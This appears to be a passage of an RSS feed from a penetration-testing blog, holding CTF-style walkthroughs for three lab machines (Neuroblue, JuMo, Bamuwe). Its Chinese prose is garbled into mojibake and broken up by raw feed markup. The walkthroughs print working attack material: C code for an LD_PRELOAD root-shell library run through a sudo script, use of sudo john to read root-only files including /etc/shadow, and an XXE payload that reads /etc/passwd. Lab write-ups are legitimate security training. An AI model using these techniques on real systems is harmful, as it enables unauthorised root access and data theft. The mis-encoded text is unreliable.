3.  ÊâßË°å `sudo /opt/export` ÂëΩ‰ª§ÔºåÂ∑ßÂ¶ôÂú∞Â∞Ü `LD_PRELOAD` ‰Ωú‰∏∫Á¨¨‰∏Ä‰∏™ÂèÇÊï∞ (`$1`)ÔºåÂ∞ÜÊàë‰ª¨ÊÅ∂ÊÑèÂ∫ìÁöÑË∑ØÂæÑ `/tmp/exp.so` ‰Ωú‰∏∫Á¨¨‰∫å‰∏™ÂèÇÊï∞ (`$2`) ‰º†ÈÄíÁªôËÑöÊú¨„ÄÇ
4.  ËÑöÊú¨ÊâßË°åÂà∞ `export '$1'='$2'` Êó∂ÔºåÂ∞±‰ºöÂú® **root ÊùÉÈôê**‰∏ãÊâßË°å `export LD_PRELOAD=/tmp/exp.so`„ÄÇ
5.  ÂΩìËÑöÊú¨ÊúÄÂêéÊâßË°å `/usr/local/sbin/VMBreaker` Êó∂ÔºåÁî±‰∫é `LD_PRELOAD` ÁéØÂ¢ÉÂèòÈáèÂ∑≤Ë¢´ËÆæÁΩÆÔºåÂä®ÊÄÅÈìæÊé•Âô®‰ºö‰ºòÂÖàÂä†ËΩΩ `/tmp/exp.so`Ôºå‰ªéËÄåÊâßË°åÊàë‰ª¨ÁöÑÊÅ∂ÊÑè‰ª£Á†ÅÔºåËé∑Âæó root shell„ÄÇ

### 4.5. ÊâßË°åÂà©Áî® (Executing the Exploit)

1. **ÂàõÂª∫ÊÅ∂ÊÑè C ‰ª£Á†Å:**
   ÂàáÊç¢Âà∞ÂèØÂÜôÁõÆÂΩï `/tmp`ÔºåÂàõÂª∫ `exp.c` Êñá‰ª∂„ÄÇ

   ```bash
   welcome@Neuroblue:~$ cd /tmp
   welcome@Neuroblue:/tmp$ cat &lt;&lt; EOF &gt; exp.c
   #define _GNU_SOURCE
   #include &lt;stdio.h&gt;
   #include &lt;stdlib.h&gt;
   #include &lt;unistd.h&gt;
   #include &lt;dlfcn.h&gt;
   
   // ÊûÑÈÄ†ÂáΩÊï∞ÔºåÂú®Â∫ìÂä†ËΩΩÊó∂Ëá™Âä®ÊâßË°å
   void __attribute__((constructor)) _init() {
       unsetenv('LD_PRELOAD'); // Ê∏ÖÁêÜÁéØÂ¢ÉÂèòÈáèÔºåÈÅøÂÖçÂΩ±ÂìçÂ≠êshell
       setuid(0);             // ËÆæÁΩÆUID‰∏∫root
       setgid(0);             // ËÆæÁΩÆGID‰∏∫root
       system('/bin/bash -p'); // ÊâßË°å‰∏Ä‰∏™‰øùÁïôÊùÉÈôêÁöÑroot shell
       exit(0); // ÊâßË°åÂÆåshellÂêéÈÄÄÂá∫ÔºåÈÅøÂÖçÂêéÁª≠Á®ãÂ∫èÊâßË°åÔºàÂèØÈÄâÔºâ
   }
   EOF
   ```

2. **ÁºñËØëÂÖ±‰∫´Â∫ì:**
   ‰ΩøÁî® `gcc` ÁºñËØë C ‰ª£Á†Å‰∏∫ÂÖ±‰∫´Â∫ì„ÄÇ

   ```bash
   welcome@Neuroblue:/tmp$ gcc -fPIC -shared -o /tmp/exp.so /tmp/exp.c -nostartfiles
   welcome@Neuroblue:/tmp$ ls -l /tmp/exp.so
   -rwxr-xr-x 1 welcome welcome 14736 May  1 02:29 /tmp/exp.so # &lt;-- ÁºñËØëÊàêÂäü
   ```

3. **Ëß¶ÂèëÊºèÊ¥ûÂπ∂Ê≥®ÂÖ•:**
   ÊâßË°å `sudo /opt/export` ÂëΩ‰ª§ÔºåÂπ∂‰º†ÈÄíÁ≤æÂøÉÊûÑÈÄ†ÁöÑÂèÇÊï∞„ÄÇ

   ```bash
   welcome@Neuroblue:/tmp$ sudo /opt/export LD_PRELOAD /tmp/exp.so '' '' '' '' '' ''
   # Ê≠§Â§ÑËÑöÊú¨ÂÜÖÈÉ®ÊâßË°å export LD_PRELOAD=/tmp/exp.so
   # ÁÑ∂ÂêéÊâßË°å /usr/local/sbin/VMBreaker
   # VMBreaker Âä†ËΩΩÊó∂ÔºåÂä®ÊÄÅÈìæÊé•Âô®ÂèëÁé∞ LD_PRELOADÔºåÂä†ËΩΩ exp.so
   # exp.so ÁöÑÊûÑÈÄ†ÂáΩÊï∞Ë¢´ÊâßË°å...
   root@Neuroblue:/tmp# 
   ```

### 4.6. Ëé∑Âèñ Root ÊùÉÈôê (Gaining Root Access)

ÊàêÂäüÊâßË°å‰∏äËø∞ `sudo` ÂëΩ‰ª§ÂêéÔºå`/tmp/exp.so` ‰∏≠ÁöÑÊûÑÈÄ†ÂáΩÊï∞Ë¢´Ëß¶ÂèëÔºåÊàë‰ª¨Áõ¥Êé•Ëé∑Âæó‰∫Ü‰∏Ä‰∏™ root ÊùÉÈôêÁöÑ shell„ÄÇ

```bash
root@Neuroblue:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@Neuroblue:/tmp# whoami
root
```

ÊàêÂäüËé∑Âèñ root ÊùÉÈôê„ÄÇ

* **Ëé∑Âèñ Root Flag:** ËØªÂèñ `/root/root.txt` Êñá‰ª∂„ÄÇ

  ```bash
  root@Neuroblue:/tmp# cat /root/root.txt 
  flag{root-3960a29b415a278c2d88bb0543c5f283}
  ```



**Ê≥®ËÆ∞Ôºö** Âú®Êú¨Êä•ÂëäÁöÑÊí∞ÂÜôËøáÁ®ã‰∏≠ÔºåAI ËØ≠Ë®ÄÊ®°Âûã‰∏∫ÈÉ®ÂàÜÁ´†ËäÇÁöÑÊñáÊú¨ÁªÑÁªá„ÄÅÊ¶ÇÂøµÈòêËø∞ÂèäËØ≠Ë®Ä‰ºòÂåñÊèê‰æõ‰∫ÜËæÖÂä©ÊîØÊåÅ„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/shen-tou-ce-shi-bao-gao-%20-%20Neuroblue%20%28-ce-shi-ba-ji-%29.html</guid><pubDate>Fri, 27 Jun 2025 09:28:14 +0000</pubDate></item><item><title>Ê∏óÈÄèÊµãËØïÊä•Âëä - JuMo (ÊµãËØïÈù∂Êú∫)</title><link>https://7r1UMPHK.github.io/post/shen-tou-ce-shi-bao-gao-%20-%20JuMo%20%28-ce-shi-ba-ji-%29.html</link><description># 1. ÁÆÄ‰ªã

- Èù∂Êú∫ÂêçÁß∞: JuMo (Êú™ÂèëÂ∏ÉÔºåÂÜÖÈÉ®ÊµãËØïÈù∂Êú∫ÔºåÂèØËÉΩÂêéÁª≠ÂèëÂ∏É‰∫é HackMyVm)
- ÈöæÂ∫¶: ‰Ωé (Low)
- ÁõÆÊ†á IP: 192.168.205.182 (ÈÄöËøá arp-scan ÂèëÁé∞)
- ÊîªÂáªÊú∫ IP: 192.168.205.128
- ÁõÆÊ†á: Ëé∑ÂèñÁõÆÊ†áÁ≥ªÁªüÁöÑ root ÊùÉÈôêÂπ∂ÊâæÂà∞ flag„ÄÇ

# 2. ‰ø°ÊÅØÊî∂ÈõÜ (Enumeration)

## 2.1. ‰∏ªÊú∫ÂèëÁé∞

È¶ñÂÖàÔºå‰ΩøÁî® arp-scan Âú®Êú¨Âú∞ÁΩëÁªú‰∏≠ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫ÁöÑ IP Âú∞ÂùÄ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:64:60:b9, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
# ... (ÂÖ∂‰ªñËæìÂá∫) ...
192.168.205.182 08:00:27:ff:bf:ce       PCS Systemtechnik GmbH #&lt;-- ÁõÆÊ†á‰∏ªÊú∫
# ... (ÂÖ∂‰ªñËæìÂá∫) ...
Ending arp-scan 1.10.0: 256 hosts scanned in 2.033 seconds (125.92 hosts/sec). 4 responded
```

Á°ÆËÆ§ÁõÆÊ†á IP ‰∏∫ 192.168.205.182„ÄÇ

## 2.2. Á´ØÂè£Êâ´Êèè

‰ΩøÁî® nmap ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•ËØÜÂà´ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -p- 192.168.205.182
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 08:46 CST
Nmap scan report for 192.168.205.182
Host is up (0.00022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh     #&lt;-- SSH ÊúçÂä°ÂºÄÊîæ
80/tcp open  http    #&lt;-- HTTP ÊúçÂä°ÂºÄÊîæ
MAC Address: 08:00:27:FF:BF:CE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.47 seconds
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÁõÆÊ†áÂºÄÊîæ‰∫Ü 22 (SSH) Âíå 80 (HTTP) Á´ØÂè£„ÄÇ

# 3. Ëé∑ÂèñÂàùÂßãËÆøÈóÆÊùÉÈôê (Initial Foothold)

## 3.1. Web ÊúçÂä°Êé¢Êµã

ËÆøÈóÆÁõÆÊ†á‰∏ªÊú∫ÁöÑ 80 Á´ØÂè£Ôºà http://192.168.205.182 Ôºâ„ÄÇ

![image-20250411084817446](https://7r1umphk.github.io/image/20250411084824566.png)

Ëøô‰∏™ÊèêÁ§∫Êàë‰ª¨Âú® hackmyvm Âπ≥Âè∞‰∏äÊü•Êâæ‰∏Ä‰∏™Âêç‰∏∫ check ÁöÑÁî®Êà∑„ÄÇ

## 3.2. ‰ø°ÊÅØÊåñÊéò

Âú® HackMyVm ÁΩëÁ´ô‰∏äÊêúÁ¥¢Áî®Êà∑ check„ÄÇ

![image-20250411085044849](https://7r1umphk.github.io/image/20250411085044939.png)

ÊâæÂà∞‰∫ÜËØ•Áî®Êà∑ÁöÑ‰∏™‰∫∫ËµÑÊñôÔºåÂÖ∂‰∏≠ÂåÖÂê´‰∏Ä‰∏™Â§ñÈÉ®ÈìæÊé•„ÄÇËÆøÈóÆËØ•ÈìæÊé•Ôºö

![image-20250411085314126](https://7r1umphk.github.io/image/20250411085314150.png)

È°µÈù¢‰∏äÊúâ‰∏Ä‰∏≤ Base64 ÁºñÁ†ÅÁöÑÂ≠óÁ¨¶‰∏≤ d2VsY29tZTpqdW1v„ÄÇÂØπÂÖ∂ËøõË°åËß£Á†ÅÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ echo 'd2VsY29tZTpqdW1v' | base64 -d
welcome:jumo
```

Ëß£Á†ÅÂêéÂæóÂà∞ welcome:jumoÔºåËøôÂæàÂèØËÉΩÊòØ‰∏ÄÂØπ SSH ÁôªÂΩïÂá≠ÊçÆÔºàÁî®Êà∑Âêç:ÂØÜÁ†ÅÔºâ„ÄÇ

## 3.3. SSH ÁôªÂΩï

‰ΩøÁî®Ëé∑ÂèñÂà∞ÁöÑÂá≠ÊçÆÂ∞ùËØï SSH ÁôªÂΩïÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ssh welcome@192.168.205.182
# ...(SSH ËøûÊé•Á°ÆËÆ§)...
Password: # ËæìÂÖ•ÂØÜÁ†Å jumo
Linux JuMo 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64
# ... (Ê¨¢Ëøé‰ø°ÊÅØ) ...
welcome@JuMo:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

ÊàêÂäü‰ª• welcome Áî®Êà∑Ë∫´‰ªΩÁôªÂΩïÁ≥ªÁªü„ÄÇ

# 4. ÊùÉÈôêÊèêÂçá (Privilege Escalation)

## 4.1. Sudo ÊùÉÈôêÊ£ÄÊü•

Ê£ÄÊü• welcome Áî®Êà∑Êã•ÊúâÁöÑ sudo ÊùÉÈôêÔºö

```bash
welcome@JuMo:~$ sudo -l
Matching Defaults entries for welcome on JuMo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on JuMo:
    (ALL : ALL) NOPASSWD: /usr/sbin/john   #&lt;-- ÂèØ‰ª•ÂÖçÂØÜ‰ª• root ÊùÉÈôêÊâßË°å john
```

ËæìÂá∫ÊòæÁ§∫ welcome Áî®Êà∑ÂèØ‰ª•Êó†ÈúÄÂØÜÁ†Å (NOPASSWD) ‰ª•‰ªª‰ΩïÁî®Êà∑ (ALL:ALL) ÁöÑË∫´‰ªΩÊâßË°å /usr/sbin/john ÂëΩ‰ª§„ÄÇjohn (John the Ripper) ÊòØ‰∏Ä‰∏™ÂØÜÁ†ÅÁ†¥Ëß£Â∑•ÂÖ∑„ÄÇ

## 4.2. Âà©Áî® Sudo ÊùÉÈôê

Áî±‰∫éÂèØ‰ª•‰ª• root Ë∫´‰ªΩÊâßË°å johnÔºåÂπ∂‰∏î /root ÁõÆÂΩï‰∏ãÁöÑÊñá‰ª∂ÈÄöÂ∏∏Âè™Êúâ root Áî®Êà∑ÂèØËØªÔºåÊàë‰ª¨ÂèØ‰ª•Â∞ùËØïÂà©Áî® john ËØªÂèñ /root ÁõÆÂΩï‰∏ãÁöÑÊñá‰ª∂„ÄÇ

### ÊñπÊ≥ï‰∏ÄÔºöÁõ¥Êé•ËØªÂèñÂèØËÉΩÁöÑ Flag Êñá‰ª∂ (ÊàëÁöÑÊñπÊ≥ï)

Â∑≤Áü• /root/root.txt ÂåÖÂê´‰∫Ü flag„ÄÇËôΩÁÑ∂ john ÁöÑ --wordlist ÈÄâÈ°πÈÄöÂ∏∏Áî®‰∫éÊåáÂÆöÂØÜÁ†ÅÂ≠óÂÖ∏Ôºå‰ΩÜÈÖçÂêà --stdout ÈÄâÈ°πÔºåjohn ‰ºöÂ∞Ü wordlist ÁöÑÂÜÖÂÆπÔºàÊàñÁîüÊàêÁöÑÂÄôÈÄâÂØÜÁ†ÅÔºâÊâìÂç∞Âà∞Ê†áÂáÜËæìÂá∫„ÄÇÂà©Áî® sudo ÊùÉÈôêÔºåËøôÂèØ‰ª•Áî®Êù•ËØªÂèñ root ÊùÉÈôêÊâçËÉΩËÆøÈóÆÁöÑÊñá‰ª∂ÂÜÖÂÆπ„ÄÇ

```bash
welcome@JuMo:~$ sudo /usr/sbin/john --wordlist=/root/root.txt --stdout
Press 'q' or Ctrl-C to abort, almost any other key for status
flag{521ca933d6e159a50c2c04e7daa930f6}  #&lt;-- ËØªÂèñÂπ∂ËæìÂá∫‰∫Ü /root/root.txt ÁöÑÂÜÖÂÆπ
1p 0:00:00:00 100% 100.0p/s flag{521ca933d6e159a50c2c04e7daa930f6}
```

Ê≠§ÂëΩ‰ª§ÊàêÂäüËØªÂèñ‰∫Ü /root/root.txt Êñá‰ª∂ÔºåÂÜÖÂÆπÂç≥‰∏∫ flag„ÄÇ

### ÊñπÊ≥ï‰∫åÔºöËØªÂèñÂèØËÉΩÁöÑ Flag Êñá‰ª∂ (ta0Á•ûÁöÑÊñπÊ≥ï)

```bash
welcome@JuMo:~$ sudo /usr/sbin/john /etc/shadow --wordlist=/root/root.txt
Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 100% 0g/s 100.0p/s 200.0c/s 200.0C/s flag{521ca933d6e159a50c2c04e7daa930f6} 
Session completed
```

## 4.3. Ëé∑Âèñ Root ÊùÉÈôê

Ê†πÊçÆÁæ§‰∏ªÊèêÁ§∫Êàë‰ª¨ÂèØÁü•rootÂØÜÁ†Å‰∏∫root flag

```bash
welcome@JuMo:~$ su -
Password: # ËæìÂÖ• 521ca933d6e159a50c2c04e7daa930f6
root@JuMo:~# id
uid=0(root) gid=0(root) groups=0(root)
root@JuMo:~# cat /root/root.txt
flag{521ca933d6e159a50c2c04e7daa930f6}
```

ÊàêÂäüËé∑Âèñ root ÊùÉÈôê„ÄÇÊúÄÁªàÁöÑ flag Â≠òÂÇ®Âú® /root/root.txt ‰∏≠„ÄÇ

# 5. ÊÄªÁªì

Êú¨Ê¨°Ê∏óÈÄèÊµãËØïÈÄöËøá‰ª•‰∏ãÊ≠•È™§ÂÆåÊàêÔºö

1. ‰ø°ÊÅØÊî∂ÈõÜ: ‰ΩøÁî® arp-scan Âíå nmap ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫ÂèäÂÖ∂ÂºÄÊîæÁöÑ SSH Âíå HTTP ÊúçÂä°„ÄÇ
2. ÂàùÂßãËÆøÈóÆ: ÂàÜÊûêÁΩëÈ°µÊ∫ê‰ª£Á†ÅÔºåÂèëÁé∞ÊåáÂêë HackMyVm Áî®Êà∑ check ÁöÑÁ∫øÁ¥¢ÔºåËøõËÄåÊâæÂà∞ÂÖ∂Â§ñÈÉ®ÈìæÊé•‰∏≠ÁöÑ Base64 ÁºñÁ†ÅÂá≠ÊçÆÔºåÊàêÂäüÈÄöËøá SSH ÁôªÂΩï welcome Áî®Êà∑„ÄÇ
3. ÊùÉÈôêÊèêÂçá: ÂèëÁé∞ welcome Áî®Êà∑ÂèØÈÄöËøá sudo ÂÖçÂØÜÊâßË°å john ÂëΩ‰ª§„ÄÇÂà©Áî®Ê≠§ÊùÉÈôêÔºåÈÄöËøá john --wordlist=/root/root.txt --stdout Áõ¥Êé•ËØªÂèñ‰∫Ü /root/root.txt ‰∏≠ÁöÑ flagÔºåÊàñËÄÖÈÄöËøá john /etc/shadow --wordlist=/root/root.txt Á†¥Ëß£Âá∫ root ÂØÜÁ†ÅÔºàÂØÜÁ†ÅÊÅ∞Â•ΩÊòØ flagÔºâÔºåÊúÄÁªà‰ΩøÁî® su ÂëΩ‰ª§ÂàáÊç¢Âà∞ root Áî®Êà∑„ÄÇ

Èù∂Êú∫ËÆæËÆ°Â∑ßÂ¶ôÔºåÂà©Áî®‰∫Ü‰ø°ÊÅØÊ≥ÑÈú≤Âíå sudo ÈÖçÁΩÆ‰∏çÂΩìÁöÑÊºèÊ¥ûÔºåÈöæÂ∫¶Á¨¶Âêà Low Á∫ßÂà´„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/shen-tou-ce-shi-bao-gao-%20-%20JuMo%20%28-ce-shi-ba-ji-%29.html</guid><pubDate>Fri, 27 Jun 2025 09:28:11 +0000</pubDate></item><item><title>Ê∏óÈÄèÊµãËØïÊä•Âëä - Bamuwe (ÊµãËØïÈù∂Êú∫)</title><link>https://7r1UMPHK.github.io/post/shen-tou-ce-shi-bao-gao-%20-%20Bamuwe%20%28-ce-shi-ba-ji-%29.html</link><description>## Ê∏óÈÄèÊµãËØïÊä•Âëä - Bamuwe

## 1. ÁÆÄ‰ªã

**Èù∂Êú∫ÂêçÁß∞**: Bamuwe(Êú™ÂèëÂ∏ÉÔºåÂÜÖÈÉ®ÊµãËØïÈù∂Êú∫ÔºåÂèØËÉΩÂêéÁª≠ÂèëÂ∏É‰∫é HackMyVm)
**ÈöæÂ∫¶**: ÁÆÄÂçï
**ÊîªÂáªËÄÖ IP:** `192.168.205.188` (Kali Linux)
**ÁõÆÊ†á IP:** `192.168.205.197` (Bamuwe)

## 2. ‰ø°ÊÅØÊî∂ÈõÜ (Enumeration)

### 2.1. ÁΩëÁªúÂèëÁé∞ (Network Discovery)

‰ΩøÁî® `arp-scan` Âú®Êú¨Âú∞ÁΩëÁªú‰∏≠Êé¢ÊµãÂ≠òÊ¥ª‰∏ªÊú∫„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo arp-scan -l           
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.188
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
# ... (ÂÖ∂‰ªñ‰∏ªÊú∫) ...
192.168.205.197 08:00:27:a0:8d:89       (Unknown) # &lt;-- ÂèëÁé∞ÁõÆÊ†á
# ... (ÂÖ∂‰ªñ‰∏ªÊú∫) ...

Ending arp-scan 1.10.0: 256 hosts scanned in 1.891 seconds (135.38 hosts/sec). 4 responded
```

ÁõÆÊ†á‰∏ªÊú∫ IP Á°ÆÂÆö‰∏∫ `192.168.205.197`„ÄÇMAC Âú∞ÂùÄ `08:00:27:a0:8d:89` 

### 2.2. Á´ØÂè£Êâ´Êèè (Port Scanning)

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†áËøõË°åÁ´ØÂè£Êâ´ÊèèÔºåËØÜÂà´ÂºÄÊîæÁöÑ TCP Á´ØÂè£„ÄÇ

* ËøõË°åÂÖ®Á´ØÂè£Êâ´Êèè (`-p-`) Á°ÆÂÆöÂºÄÊîæÁ´ØÂè£„ÄÇ

  ```bash
  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
  ‚îî‚îÄ$ nmap -p- 192.168.205.197
  Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-30 08:20 EDT
  Nmap scan report for 192.168.205.197
  Host is up (0.00016s latency).
  Not shown: 65533 closed tcp ports (reset)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  MAC Address: 08:00:27:A0:8D:89 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
  
  Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds
  ```

  ÁªìÊûúÊòæÁ§∫ÁõÆÊ†áÂºÄÊîæ‰∫Ü‰∏§‰∏™Â∏∏ËßÅÁöÑÁ´ØÂè£Ôºö`22 (SSH)` Âíå `80 (HTTP)`„ÄÇ

### 2.3. Web ÊúçÂä°Êé¢Êµã (Web Enumeration)

Web ÊúçÂä°ÈÄöÂ∏∏ÊòØËé∑ÂèñÂàùÂßãËÆøÈóÆÊùÉÈôêÁöÑÁ™ÅÁ†¥Âè£ÔºåÂõ†Ê≠§ÊàëÈ¶ñÂÖàÊ£ÄÊü•‰∫Ü 80 Á´ØÂè£ÁöÑ HTTP ÊúçÂä°„ÄÇ‰ΩøÁî® `curl` ÊàñÊµèËßàÂô®ËÆøÈóÆ `http://192.168.205.197`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl http://192.168.205.197                                     
&lt;!DOCTYPE html&gt;
    &lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;Library Membership Registration&lt;/title&gt;
        &lt;style&gt;
            body {
                background: #f0f2f5;
                font-family: 'Helvetica Neue', Arial, sans-serif;
                margin: 0;
                padding: 20px;
            }
            .container {
                max-width: 500px;
                margin: 40px auto;
                background: white;
                padding: 40px;
                border-radius: 12px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            h2 {
                color: #1a73e8;
                margin-bottom: 30px;
                text-align: center;
            }
            .form-group {
                margin-bottom: 20px;
            }
            label {
                display: block;
                margin-bottom: 8px;
                color: #5f6368;
                font-weight: 500;
            }
            input[type='text'], 
            input[type='password'] {
                width: 100%;
                padding: 12px;
                border: 1px solid #dadce0;
                border-radius: 6px;
                font-size: 16px;
                transition: border-color 0.2s;
            }
            input[type='text']:focus, 
            input[type='password']:focus {
                border-color: #1a73e8;
                outline: none;
            }
            input[type='submit'] {
                background: #1a73e8;
                color: white;
                padding: 14px 24px;
                border: none;
                border-radius: 6px;
                font-size: 16px;
                cursor: pointer;
                width: 100%;
                transition: background 0.2s;
            }
            input[type='submit']:hover {
                background: #1557b0;
            }
            .result {
                padding: 20px;
                background: #e8f0fe;
                border-radius: 6px;
                color: #1967d2;
                margin-top: 20px;
            }
        &lt;/style&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;div class='container'&gt;
            &lt;h2&gt;Member Registration&lt;/h2&gt;
            &lt;form method='post'&gt;
                &lt;div class='form-group'&gt;
                    &lt;label&gt;Full Name:&lt;/label&gt;
                    &lt;input type='text' name='name'&gt;
                &lt;/div&gt;
                &lt;div class='form-group'&gt;
                    &lt;label&gt;Phone Number:&lt;/label&gt;
                    &lt;input type='text' name='tel'&gt;
                &lt;/div&gt;
                &lt;div class='form-group'&gt;
                    &lt;label&gt;Email Address:&lt;/label&gt;
                    &lt;input type='text' name='email'&gt;
                &lt;/div&gt;
                &lt;div class='form-group'&gt;
                    &lt;label&gt;Password:&lt;/label&gt;
                    &lt;input type='password' name='password'&gt;
                &lt;/div&gt;
                &lt;input type='submit' value='Register Now'&gt;
            &lt;/form&gt;
        &lt;/div&gt;
        
        &lt;!-- XML STRUCTURE EXAMPLE --&gt;
        &lt;!--
        &lt;user&gt;
          &lt;name&gt;John Doe&lt;/name&gt;
          &lt;tel&gt;123-4567890&lt;/tel&gt;
          &lt;email&gt;admin@admin.com&lt;/email&gt;
          &lt;password&gt;secret123&lt;/password&gt;
        &lt;/user&gt;
        --&gt;
    &lt;/body&gt;
    &lt;/html&gt;
```

Ëøô‰∏™ XML Ê≥®ÈáäÂº∫ÁÉàÊöóÁ§∫‰∫ÜÂêéÁ´ØÂèØËÉΩ‰ΩøÁî® XML Ê†ºÂºèÊù•Â§ÑÁêÜÁî®Êà∑Êèê‰∫§ÁöÑÊ≥®ÂÜå‰ø°ÊÅØ„ÄÇËøôÁ´ãÂç≥ËÆ©ÊàëÊÄÄÁñëÊòØÂê¶Â≠òÂú® **XML Â§ñÈÉ®ÂÆû‰ΩìÊ≥®ÂÖ• (XXE)** ÊºèÊ¥û„ÄÇ

![Web Registration Page](https://7r1umphk.github.io/image/20250430202620701.png)

## 3. Ëé∑ÂèñÂàùÂßãËÆøÈóÆÊùÉÈôê (Initial Access - XXE)

### 3.1. Á°ÆËÆ§ÊºèÊ¥û (Confirming Vulnerability)

‰∏∫‰∫ÜÈ™åËØÅ XXE ÊºèÊ¥ûÔºåÊàëÈúÄË¶ÅÊûÑÈÄ†‰∏Ä‰∏™ÂåÖÂê´ XML Â§ñÈÉ®ÂÆû‰ΩìÂ£∞ÊòéÁöÑ POST ËØ∑Ê±Ç„ÄÇ

![XXE Payload Preparation](https://7r1umphk.github.io/image/20250430202715434.png)

ÊàëÊ≥®ÊÑèÂà∞Êèê‰∫§Ë°®ÂçïÂêéÔºåËæìÂÖ•ÁöÑ Email Âú∞ÂùÄ‰ºöË¢´ÂõûÊòæÂà∞ÂìçÂ∫îÈ°µÈù¢‰∏≠„ÄÇËøôÊèê‰æõ‰∫Ü‰∏Ä‰∏™Êñπ‰æøÁöÑ‰ΩçÁΩÆÊù•Ê≥®ÂÖ•Âπ∂ÊòæÁ§∫Â§ñÈÉ®ÂÆû‰ΩìÁöÑÂÜÖÂÆπ„ÄÇ

**ÊûÑÈÄ† HTTP POST ËØ∑Ê±Ç (‰ΩøÁî® Burp Repeater):**

```http
POST / HTTP/1.1
Host: 192.168.205.197
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 231
Origin: http://192.168.205.197
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://192.168.205.197/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;
      &lt;user&gt;
          &lt;name&gt;John Doe&lt;/name&gt;
          &lt;tel&gt;123-4567890&lt;/tel&gt;
          &lt;email&gt;&amp;xxe;&lt;/email&gt;
          &lt;password&gt;secret123&lt;/password&gt;
        &lt;/user&gt;
```

* **ÂàÜÊûêÂìçÂ∫î:**

  ÊúçÂä°Âô®ËøîÂõûÁöÑÂìçÂ∫îÈ°µÈù¢‰∏≠ÔºåÂéüÊú¨ÊòæÁ§∫ Email ÁöÑÂú∞ÊñπÔºåÁé∞Âú®ÊòæÁ§∫‰∫Ü `/etc/passwd` Êñá‰ª∂ÁöÑÂÜÖÂÆπ„ÄÇ

  ![XXE Result - /etc/passwd Content](https://7r1umphk.github.io/image/20250430203121961.png)

  ËøôÊàêÂäüÁ°ÆËÆ§‰∫Ü XXE ÊºèÊ¥ûÁöÑÂ≠òÂú®„ÄÇ‰ªé `/etc/passwd` ÁöÑÂÜÖÂÆπ‰∏≠ÔºåÊàëÊ≥®ÊÑèÂà∞‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ `welcome` ÁöÑÊôÆÈÄöÁî®Êà∑ (`uid=1000`)„ÄÇ

### 3.2. ÊºèÊ¥ûÂà©Áî® (Exploitation - Credential Discovery)

